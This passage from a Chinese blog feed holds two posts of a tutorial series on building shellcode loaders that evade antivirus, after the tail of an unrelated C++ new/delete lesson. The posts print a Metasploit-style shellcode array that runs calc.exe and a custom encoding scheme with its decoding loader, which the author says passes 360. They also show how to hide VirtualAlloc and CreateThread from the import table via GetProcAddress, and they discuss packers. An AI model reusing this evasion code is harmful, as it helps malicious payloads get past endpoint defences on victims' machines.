*pi = <span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">10</span>);       <span class="comment">//申请一段空间存储int类型数据，初始值为10</span></span><br><span class="line"><span class="type">double</span> *pd = <span class="keyword">new</span> <span class="built_in">double</span>();   <span class="comment">//申请一段空间存储double类型的数据，默认初始值为0</span></span><br></pre></td></tr></table></figure><p>new也可以用来创建数组对象，其格式如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> 数据类型[数组长度];</span><br></pre></td></tr></table></figure><p>用new运算符分配内存，使用后要及时释放以免造成内存泄露，C++提供了delete运算符来释放new出来的内存空间，其格式如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> 指针名;</span><br></pre></td></tr></table></figure><p>直接作用于指针就可以删除由new创建的对象，释放指针所指向的内存空间。但在释放数组对象时要在指针名前加上[]，其格式如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> []指针名;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 编程语言 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从0开始写ShellCode加载器0x5-代码混淆</title>
      <link href="/BypassAVLearning5.html"/>
      <url>/BypassAVLearning5.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是从0开始写ShellCode加载器的第5篇文章，文章列表，样本demo已上传到<a href="https://github.com/luckyfuture0177/ReZeroBypassAV">GitHub</a></p></blockquote><blockquote><p>尝试了几种公开的源码混淆，软件壳方案，效果并不理想。代码混淆这个点暂时搁置。</p></blockquote><p>免杀技术日新月异，然而除非有巧妙的思路出现，多数情况下只是和杀软标记的特征在做对抗。这个过程有点像绕WAF规则。我们先是将shellcode分离加载，又将导入表中敏感函数自定义，又将url地址采用命令行参数的方式传参给程序。上述这些行为的目的都是规避杀软的特征检测。</p><h3 id="代码混淆"><a href="#代码混淆" class="headerlink" title="代码混淆"></a>代码混淆</h3><p>然而一般情况下，C/C++程序中的字符串常量会被硬编码到程序中（.data段，也就是数据段），尤其是全局变量最容易被定位到。使用strings命令查看</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220328204130128.png" alt="image-20220328204130128"></p><p>程序中的函数名，字符串常量一览无遗。尽管我们隐藏了导入地址表，VirtualAlloc等字符串还是在里面的。那么对此有什么解决办法吗？在<a href="https://payloads.online/archivers/2020-11-29/1/">倾旋的文章</a>中，将”VirtualAlloc”字符串base64编码后传入，调用时再将base64的密文隐式解密。这样程序中只有”VmlydHVhbEFsbG9j”之类的字符串，没有敏感函数名了。</p><p>这是一个十分巧妙的方法，但不足之处是要在编写代码时考虑好加密解密的问题，如果能有自动化的工具帮助来完成这一过程就再好不过了。</p><blockquote><p>代码混淆(Obfuscated code)亦称花指令，是将计算机程序的代码，转换成一种功能上等价，但是难于阅读和理解的形式的行为。 代码混淆可以用于程序源代码，也可以用于程序编译而成的中间代码。 执行代码混淆的程序被称作代码混淆器。 已经存在许多种功能各异的代码混淆器。</p></blockquote><p>我想要一个在源码级的代码混淆工具，尝试了很多工具后没有找到满意的。代码混淆只是在静态上加强逆向的难度，对于程序的函数调用，行为等并没有混淆作用。这一块先暂时搁置，未来看一些OLLVM相关的知识。</p><h3 id="shellcode混淆"><a href="#shellcode混淆" class="headerlink" title="shellcode混淆"></a>shellcode混淆</h3><p>使用msf生成的shellcode也是具有特征的，对shellcode进行处理可以消除特征。最基本的处理方式是异或加密，实现代码很简单。但经过查询资料，我发现异或操作本身也很敏感。于是我想到了自己写一个加密方式。</p><p>首先我们来写对shellcode进行加密的程序。在分离免杀中，我已经将shellcode转换成了字符型数组。继续这个思路对数组进行加密。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x82\x0\x0\x0\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30\x8b\x52\xc\x8b\x52\x14\x8b\x72\x28\xf\xb7\x4a\x26\x31\xff\xac\x3c\x61\x7c\x2\x2c\x20\xc1\xcf\xd\x1\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x1\xd1\x51\x8b\x59\x20\x1\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x1\xd6\x31\xff\xac\xc1\xcf\xd\x1\xc7\x38\xe0\x75\xf6\x3\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x1\xd3\x66\x8b\xc\x4b\x8b\x58\x1c\x1\xd3\x8b\x4\x8b\x1\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb\x8d\x5d\x6a\x1\x8d\x85\xb2\x0\x0\x0\x50\x68\x31\x8b\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x68\xa6\x95\xbd\x9d\xff\xd5\x3c\x6\x7c\xa\x80\xfb\xe0\x75\x5\xbb\x47\x13\x72\x6f\x6a\x0\x53\xff\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x0\x0&quot;</span>;</span><br><span class="line"><span class="type">int</span> shellcode_size = <span class="keyword">sizeof</span>(buf);</span><br><span class="line"><span class="built_in">cout</span> &lt;&lt; <span class="keyword">sizeof</span>(buf) &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> code = buf[i];</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>, buf[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; shellcode_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">int</span> code = buf[i];</span><br><span class="line">        <span class="keyword">if</span> (code == <span class="number">0</span>) <span class="comment">//如果为0，不做处理</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>, code);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (code % <span class="number">2</span> == <span class="number">0</span>)  <span class="comment">//如果为偶数 加1</span></span><br><span class="line">        &#123;</span><br><span class="line">            code++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (code % <span class="number">2</span> != <span class="number">0</span>) <span class="comment">//如果为奇数 乘2</span></span><br><span class="line">        &#123;</span><br><span class="line">            code = code * <span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>, code);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">------加密前----------</span><br><span class="line">252,232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193,207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,106,1,141,133,178,0,0,0,80,104,49,139,111,135,255,213,187,240,181,162,86,104,166,149,189,157,255,213,60,6,124,10,128,251,224,117,5,187,71,19,114,111,106,0,83,255,213,99,97,108,99,46,101,120,101,0,0,0</span><br><span class="line">----------加密后-----</span><br><span class="line">253,233,131,0,0,0,97,274,458,98,193,101,278,81,49,278,83,13,278,83,21,278,115,41,30,366,75,39,98,510,173,61,194,125,3,45,33,386,414,26,2,398,227,243,83,174,278,83,17,278,75,61,278,77,34,121,454,73,2,418,162,278,178,33,2,422,278,146,25,454,59,146,278,53,278,2,215,98,510,173,386,414,26,2,398,57,225,234,247,6,250,249,118,250,37,234,229,89,278,89,37,2,422,103,278,13,150,278,89,29,2,422,278,5,278,2,209,274,69,37,37,182,182,194,178,91,162,510,225,190,190,91,278,19,470,282,186,107,2,282,266,179,0,0,0,81,105,98,278,222,270,510,426,374,241,362,163,87,105,167,298,378,314,510,426,61,7,125,11,129,502,225,234,10,374,142,38,115,222,107,0,166,510,426,198,194,109,198,47,202,121,202,0,0,0</span><br></pre></td></tr></table></figure><p>把加密后的数组拿出来，再写一个解密加载程序</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> a[] = &#123; <span class="number">253</span>,<span class="number">233</span>,<span class="number">131</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">97</span>,<span class="number">274</span>,<span class="number">458</span>,<span class="number">98</span>,<span class="number">193</span>,<span class="number">101</span>,<span class="number">278</span>,<span class="number">81</span>,<span class="number">49</span>,<span class="number">278</span>,<span class="number">83</span>,<span class="number">13</span>,<span class="number">278</span>,<span class="number">83</span>,<span class="number">21</span>,<span class="number">278</span>,<span class="number">115</span>,<span class="number">41</span>,<span class="number">30</span>,<span class="number">366</span>,<span class="number">75</span>,<span class="number">39</span>,<span class="number">98</span>,<span class="number">510</span>,<span class="number">173</span>,<span class="number">61</span>,<span class="number">194</span>,<span class="number">125</span>,<span class="number">3</span>,<span class="number">45</span>,<span class="number">33</span>,<span class="number">386</span>,<span class="number">414</span>,<span class="number">26</span>,<span class="number">2</span>,<span class="number">398</span>,<span class="number">227</span>,<span class="number">243</span>,<span class="number">83</span>,<span class="number">174</span>,<span class="number">278</span>,<span class="number">83</span>,<span class="number">17</span>,<span class="number">278</span>,<span class="number">75</span>,<span class="number">61</span>,<span class="number">278</span>,<span class="number">77</span>,<span class="number">34</span>,<span class="number">121</span>,<span class="number">454</span>,<span class="number">73</span>,<span class="number">2</span>,<span class="number">418</span>,<span class="number">162</span>,<span class="number">278</span>,<span class="number">178</span>,<span class="number">33</span>,<span class="number">2</span>,<span class="number">422</span>,<span class="number">278</span>,<span class="number">146</span>,<span class="number">25</span>,<span class="number">454</span>,<span class="number">59</span>,<span class="number">146</span>,<span class="number">278</span>,<span class="number">53</span>,<span class="number">278</span>,<span class="number">2</span>,<span class="number">215</span>,<span class="number">98</span>,<span class="number">510</span>,<span class="number">173</span>,<span class="number">386</span>,<span class="number">414</span>,<span class="number">26</span>,<span class="number">2</span>,<span class="number">398</span>,<span class="number">57</span>,<span class="number">225</span>,<span class="number">234</span>,<span class="number">247</span>,<span class="number">6</span>,<span class="number">250</span>,<span class="number">249</span>,<span class="number">118</span>,<span class="number">250</span>,<span class="number">37</span>,<span class="number">234</span>,<span class="number">229</span>,<span class="number">89</span>,<span class="number">278</span>,<span class="number">89</span>,<span class="number">37</span>,<span class="number">2</span>,<span class="number">422</span>,<span class="number">103</span>,<span class="number">278</span>,<span class="number">13</span>,<span class="number">150</span>,<span class="number">278</span>,<span class="number">89</span>,<span class="number">29</span>,<span class="number">2</span>,<span class="number">422</span>,<span class="number">278</span>,<span class="number">5</span>,<span class="number">278</span>,<span class="number">2</span>,<span class="number">209</span>,<span class="number">274</span>,<span class="number">69</span>,<span class="number">37</span>,<span class="number">37</span>,<span class="number">182</span>,<span class="number">182</span>,<span class="number">194</span>,<span class="number">178</span>,<span class="number">91</span>,<span class="number">162</span>,<span class="number">510</span>,<span class="number">225</span>,<span class="number">190</span>,<span class="number">190</span>,<span class="number">91</span>,<span class="number">278</span>,<span class="number">19</span>,<span class="number">470</span>,<span class="number">282</span>,<span class="number">186</span>,<span class="number">107</span>,<span class="number">2</span>,<span class="number">282</span>,<span class="number">266</span>,<span class="number">179</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">81</span>,<span class="number">105</span>,<span class="number">98</span>,<span class="number">278</span>,<span class="number">222</span>,<span class="number">270</span>,<span class="number">510</span>,<span class="number">426</span>,<span class="number">374</span>,<span class="number">241</span>,<span class="number">362</span>,<span class="number">163</span>,<span class="number">87</span>,<span class="number">105</span>,<span class="number">167</span>,<span class="number">298</span>,<span class="number">378</span>,<span class="number">314</span>,<span class="number">510</span>,<span class="number">426</span>,<span class="number">61</span>,<span class="number">7</span>,<span class="number">125</span>,<span class="number">11</span>,<span class="number">129</span>,<span class="number">502</span>,<span class="number">225</span>,<span class="number">234</span>,<span class="number">10</span>,<span class="number">374</span>,<span class="number">142</span>,<span class="number">38</span>,<span class="number">115</span>,<span class="number">222</span>,<span class="number">107</span>,<span class="number">0</span>,<span class="number">166</span>,<span class="number">510</span>,<span class="number">426</span>,<span class="number">198</span>,<span class="number">194</span>,<span class="number">109</span>,<span class="number">198</span>,<span class="number">47</span>,<span class="number">202</span>,<span class="number">121</span>,<span class="number">202</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="type">int</span> shellcode_size1 = <span class="keyword">sizeof</span>(a) / <span class="keyword">sizeof</span>(a[<span class="number">0</span>]);</span><br><span class="line">    <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;size of a:&quot;</span> &lt;&lt; shellcode_size1 &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; shellcode_size1; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d,&quot;</span>, a[i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (a[i] == <span class="number">0</span>) <span class="comment">//如果为0，不做处理</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a[i] % <span class="number">2</span> == <span class="number">0</span>)  <span class="comment">//如果为偶数 除2</span></span><br><span class="line">        &#123;</span><br><span class="line">            a[i] = a[i] / <span class="number">2</span>;       <span class="comment">//写回</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (a[i] % <span class="number">2</span> != <span class="number">0</span>) <span class="comment">//如果为奇数 减1</span></span><br><span class="line">        &#123;</span><br><span class="line">            a[i] = a[i] - <span class="number">1</span>;    <span class="comment">//写回</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span>* b = (<span class="type">unsigned</span> <span class="type">char</span>*)<span class="built_in">malloc</span>(shellcode_size1);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = shellcode_size1<span class="number">-1</span>; i &gt;=<span class="number">0</span>; i--)</span><br><span class="line">    &#123;</span><br><span class="line">        b[i] = <span class="type">char</span>(a[i]);  <span class="comment">//倒着写入，万一有效呢</span></span><br><span class="line">    &#125;</span><br><span class="line">    load(b, shellcode_size1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试一下效果，轻松过360，被defender乱杀</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220330153316723.png" alt="image-20220330153316723"></p><h3 id="软件加壳"><a href="#软件加壳" class="headerlink" title="软件加壳"></a>软件加壳</h3><p>除了源码级的混淆之外，还有另一种减少特征的方法。杀软检测的编译好的exe文件，一般情况下是不会对照源码进行特征标记的，mimikatz那种著名程序除外。exe中的字符主要是存储在.data段中，如果我们先将.data段中的数据加密，运行时再解密，那么杀软静态面对的是加密后的数据，无法检测特征。</p><p>这个过程其实就是软件加壳的过程，市面有很多加壳工具，比如著名的UPXshell。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220329095148450.png" alt="image-20220329095148450"></p><p>重新检测加壳后的程序，函数名和字符串都没有了，我们自定义的函数没有了，而且文件体积减小了。并且能正常运行。效果可以说非常好。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220329095259717.png" alt="image-20220329095259717"></p><p>然而，UPXshell特征也被杀软标记了，原本杀软不报毒的程序，加壳后反而报毒。同样的还有VMP壳，也被杀软标记，敢加就敢杀。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220329095559570.png" alt="image-20220329095559570"></p><p>软件加壳算是复杂技术，免费可用很少，github上直接可以拿来用的也大多数被杀毒软件标记了。</p><p><a href="https://github.com/czs108/PE-Packer%EF%BC%8C%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AE%E5%8A%A0%E5%A3%B3%E6%95%88%E6%9E%9C%E4%B8%8D%E9%94%99%EF%BC%8C%E5%8F%AA%E5%8F%AF%E6%83%9C%E4%B9%9F%E8%A2%AB%E6%9D%80%E8%BD%AF%E6%A0%87%E8%AE%B0%E4%BA%86%E3%80%82%E8%BD%AF%E4%BB%B6%E5%8A%A0%E5%A3%B3%E6%AF%94%E8%B5%B7%E6%BA%90%E7%A0%81%E6%B7%B7%E6%B7%86%EF%BC%8C%E5%8F%AF%E4%BB%A5%E8%AF%B4%E6%98%AF%E4%B8%80%E5%8A%B3%E6%B0%B8%E9%80%B8%E3%80%82%E4%BD%86%E8%A6%81%E7%86%9F%E7%BB%83%E6%8E%8C%E6%8F%A1PE%E7%BB%93%E6%9E%84%E5%92%8C%E6%B1%87%E7%BC%96%E6%89%8D%E8%83%BD%E5%AE%8C%E6%88%90%E3%80%82">https://github.com/czs108/PE-Packer，这个项目加壳效果不错，只可惜也被杀软标记了。软件加壳比起源码混淆，可以说是一劳永逸。但要熟练掌握PE结构和汇编才能完成。</a></p>]]></content>
      
      
      <categories>
          
          <category> 木马免杀 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从0开始写ShellCode加载器0x4-隐藏导入表</title>
      <link href="/BypassAVLearning4.html"/>
      <url>/BypassAVLearning4.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>这是从0开始写ShellCode加载器的第4篇文章，文章列表，样本demo已上传到<a href="https://github.com/luckyfuture0177/ReZeroBypassAV">GitHub</a></p></blockquote><p>杀毒软件扫描原理大体上可以分为三种，文件扫描，内存扫描，行为监控。其中文件和内存都是基于特征来进行扫描的。磁盘中的文件可以看作静态特征，内存中的数据可以看作动态特征。那么一个什么样的文件会被识别为病毒木马呢？</p><p>在开始此之前我们需要了解一些PE文件结构相关知识：导入地址表</p><blockquote><p><em>Import Address Table 由于导入函数就是被程序调用但其执行代码又不在程序中的函数，这些函数的代码位于一个或者多个DLL 中，当PE 文件被装入内存的时候，Windows 装载器才将DLL 装入，并将调用导入函数的指令和函数实际所处的地址联系起来(动态连接)，这操作就需要导入表完成.其中导入地址表就指示函数实际地址。 - 来源百度百科</em></p></blockquote><p>我们经常听到导出表和导入表两个词，简单来说，导出表的功能是将自身的函数，类等资源供其它程序调用，提供这类功能的程序叫做动态链接库DLL。而导入表的功能帮助程序调用DLL中的资源。</p><p>关于PE文件结构的更多信息，可以到我这篇文章中查看。</p><p>我们来分析一下<a href="https://github.com/Rvn0xsy/BadCode/blob/master/BadCode/Source.cpp">第一课代码</a>编译出来的exe文件，使用PEview工具查看。</p><p><img src= "/img/loading.gif" data-lazy-src="https://cdn.jsdelivr.net/gh/luckyfuture0177/BlogData@latest/PicGoimg/image-20220327160657184.png" alt="image-20220327160657184"></p><p>在文件的导入地址表中，代码中调用的api一览无遗，<code>Virtual Alloc</code>、<code>CreateThread</code>这类函数是杀毒软件重点关注的对象，一个几十kb的程序调用了这些函数，极有可能是木马病毒。</p><p>因此我们尝试在PE文件中抹去导入函数的名称。</p><p>我们尝试自己定义他们的函数指针，然后利用<code>GetProcAddress</code>获取函数地址，调用自己的函数名称。</p><p>自定义函数指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//typedef用于类型定义，他允许用户为已经存在的数据类型起一个别名</span></span><br><span class="line"><span class="comment">//WINAPI 意味 __stdcall，是一种函数调用方式，stdcall调用方式的函数声明为：int _stdcall function(int a, int b);</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">stdcall的调用方式意味着：</span></span><br><span class="line"><span class="comment">（1） 参数从右向左依次压入堆栈</span></span><br><span class="line"><span class="comment">（2） 由被调用函数自己来恢复堆栈</span></span><br><span class="line"><span class="comment">（3） 函数名自动加前导下划线，后面紧跟着一个@,其后紧跟着参数的尺寸</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="comment">//微软文档对VirtualAlloc函数的定义</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">LPVOID VirtualAlloc(</span></span><br><span class="line"><span class="comment">  [in, optional] LPVOID lpAddress,</span></span><br><span class="line"><span class="comment">  [in]           SIZE_T dwSize,</span></span><br><span class="line"><span class="comment">  [in]           DWORD  flAllocationType,</span></span><br><span class="line"><span class="comment">  [in]           DWORD  flProtect</span></span><br><span class="line"><span class="comment">);</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">LPVOID</span><span class="params">(WINAPI* ImportVirtualAlloc)</span><span class="params">(</span></span><br><span class="line"><span class="params">LPVOID lpAddress,</span></span><br><span class="line"><span class="params">SIZE_T dwSize,</span></span><br><span class="line"><span class="params">DWORD  flAllocationType,</span></span><br><span class="line"><span class="params">DWORD  flProtect</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="comment">//上述代码可以看作自己定义一个函数名为ImportVirtualAlloc，返回值、参数和VirtualAlloc相同的函数。</span></span><br><span class="line"><span class="comment">//下面的定义同理。</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">HANDLE</span><span class="params">(WINAPI* ImportCreateThread)</span><span class="params">(</span></span><br><span class="line"><span class="params">LPSECURITY_ATTRIBUTES   lpThreadAttributes,</span></span><br><span class="line"><span class="params">SIZE_T                  dwStackSize,</span></span><br><span class="line"><span class="params">LPTHREAD_START_ROUTINE  lpStartAddress,</span></span><br><span class="line"><span class="params">__drv_aliasesMem LPVOID lpParameter,</span></span><br><span class="line"><span class="params">DWORD                   dwCreationFlags,</span></span><br><span class="line"><span class="params">LPDWORD                 lpThreadId)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">BOOL</span><span class="params">(WINAPI* ImportVirtualProtect)</span><span class="params">(</span></span><br><span class="line"><span class="params">LPVOID lpAddress,</span></span><br><span class="line"><span class="params">SIZE_T dwSize,</span></span><br><span class="line"><span class="params">DWORD  flNewProtect,</span></span><br><span class="line"><span class="params">PDWORD lpflOldProtect</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure><p><code>GetProcAddress</code>函数用法</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">FARPROC <span class="title function_">GetProcAddress</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HMODULE hModule, <span class="comment">//包含函数或变量的 DLL 模块的句柄。LoadLibrary、 LoadLibraryEx、LoadPackagedLibrary或 GetModuleHandle函数返回此句柄。</span></span></span><br><span class="line"><span class="params">  [in] LPCSTR  lpProcName <span class="comment">//函数或变量名，或函数的序数值。如果该参数为序数值，则必须在低位字中；高位字必须为零。</span></span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"><span class="comment">//如果函数成功，则返回值是导出的函数或变量的地址。</span></span><br><span class="line"><span class="comment">//如果函数失败，则返回值为 NULL。要获取扩展的错误信息，请调用 GetLastError。</span></span><br></pre></td></tr></table></figure><p>然后在<code>main</code>函数中，定义四个函数指针来存放这些函数的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ImportVirtualAlloc MyVirtualAlloc = (ImportVirtualAlloc)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualAlloc&quot;</span>);</span><br><span class="line">ImportCreateThread MyCreateThread = (ImportCreateThread)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;CreateThread&quot;</span>);</span><br><span class="line">ImportVirtualProtect MyVirtualProtect = (ImportVirtualProtect)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;VirtualProtect&quot;</span>);</span><br><span class="line">ImportWaitForSingleObject MyWaitForSingleObject = (ImportWaitForSingleObject)GetProcAddress(GetModuleHandle(TEXT(<span class="string">&quot;kernel32.dll&quot;</span>)), <span class="string">&quot;WaitForSingleObject&quot;</span>);</span><br></pre></td></tr></table></figure><p>接下来在代码中的函数换成自己定义的指针</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="type">int</span> shellcode_size = <span class="number">0</span>;</span><br><span class="line">DWORD dwThreadId; <span class="comment">//线程id</span></span><br><span class="line">HANDLE hThread;<span class="comment">//线程句柄</span></span><br><span class="line">DWORD dwOldProtect; <span class="comment">//内存页属性</span></span><br><span class="line"><span class="type">char</span> buf[] = <span 